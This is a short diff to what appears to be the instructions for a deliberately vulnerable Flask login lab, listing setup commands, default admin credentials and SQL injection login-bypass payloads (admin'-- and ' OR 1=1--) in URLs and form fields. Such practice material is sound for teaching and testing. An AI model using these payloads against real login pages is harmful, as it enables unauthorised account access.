@@ -78,11 +78,18 @@ python init_db.py
 python app.py
 
 http://YOUR-IP:5000/login?user=admin&pwd=admin123
-
+########
 http://YOUR-IP:5000/login?user=admin'--&pwd=abc
 
+admin'--
+anything
+############
 
+#################
 http://YOUR-IP:5000/login?user=' OR 1=1--&pwd=x
+user = ' OR 1=1--
+pwd  = x
+
 
 #######################################################################
 
